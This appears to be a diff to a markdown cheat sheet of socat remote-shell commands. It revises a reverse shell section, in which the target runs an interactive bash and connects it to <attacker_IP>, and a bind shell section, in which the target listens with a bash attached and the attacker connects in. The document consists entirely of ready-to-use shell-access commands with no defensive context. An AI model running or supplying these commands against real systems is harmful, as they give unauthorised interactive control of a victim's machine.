@@ -4,18 +4,22 @@
 
 - Shell handler (attacker)
 
-`$ socat tcp-listen:<PORT>,reuseaddr,fork file:`tty`,raw,echo=0`
+```
+$ socat file:`tty`,raw,echo=0 tcp-listen:<PORT>
+```
 
 - Connect to attacker
 
-`$ socat tcp:<attacker_IP>:<PORT> exec:bash,pty,stderr,setsid,sigint,sane`
+`$ socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane tcp:<attacker_IP>:<attacker_PORT>`
 
 ## Bind Shell
 
-- Shell handler (target)
+- Target
+
+`$ socat tcp-listen:<PORT>,reuseaddr,fork exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane`
+
+- Shell handler
 
 ```
-$ socat tcp-listen:<PORT>,reuseaddr,fork exec:bash,pty,stderr,setsid,sigint,sane
-
-$ socat file:`tty`,raw,echo=0 tcp:<target_IP>:<PORT>
+$ socat file:`tty`,raw,echo=0 tcp:<target_IP>:<target_PORT>
 ```
